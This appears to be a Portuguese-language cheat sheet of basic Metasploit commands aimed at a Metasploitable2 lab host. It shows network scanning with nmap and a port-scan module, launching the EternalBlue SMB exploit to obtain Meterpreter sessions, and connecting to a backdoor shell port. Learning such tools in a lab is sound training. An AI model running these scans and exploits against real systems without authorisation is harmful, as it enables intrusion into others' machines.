# Comandos básicos do Metasploit-Framework

## Listar base de exploits do Kali Linux

$searchsploit <name service> [smb, dns, http, smtp, ftp, Apache, ProFTPd, vsftpd, samba, etc]

## Diretório do Metasploit-Framework

$ls -l /usr/share/metasploit-framework

## Run Metasploit-Framework

$sudo service postgresql start

$sudo msfdb init

$sudo msfconsole

msf > db_status

msf > help

msf > help search

msf > history

msf > show [auxiliary, exploits, payloads, options, targets, advanced, encoders, nops]

msf > search scanner

msf > search name:mysql

msf > search type:exploit platform:windows

msf > search type:exploit rank:great

msf > search cve:2022 platform:windows type:exploit

msf > grep http search oracle

msf > search type:auxiliary portscan

msf > use auxiliary/scanner/portscan/tcp

msf  auxiliary(scanner/portscan/tcp) > info

msf  auxiliary(scanner/portscan/tcp) > show options

msf  auxiliary(scanner/portscan/tcp) > set PORTS 1-1024

msf  auxiliary(scanner/portscan/tcp) > set RHOSTS 192.168.1.123

msf  auxiliary(scanner/portscan/tcp) > run

msf  auxiliary(scanner/portscan/tcp) > back

msf > nmap -sn 192.168.1.0/24

msf > nmap 192.168.1.123

msf > connect 192.168.1.123 1524

msf > exit

## Workspaces Metasploit-Framework

$ sudo service postgresql start

$ sudo msfdb init

$ sudo msfconsole

msf > db_status

msf > workspace -a metasploitable2

msf > db_nmap -sn 192.168.1.0/24

msf > hosts

msf > db_nmap -v -sV -p0-65535 192.168.1.123

msf > services

## Run Exploit Sessions in Backgroung

msf exploit(windows/smb/ms17_010_eternalblue) > exploit

meterpreter > background

msf exploit(windows/smb/ms17_010_eternalblue) > sessions

msf exploit(windows/smb/ms17_010_eternalblue) > sessiosn -i 1

meterpreter >

msf > jobs

msf > kill 0

msf > sessions -l

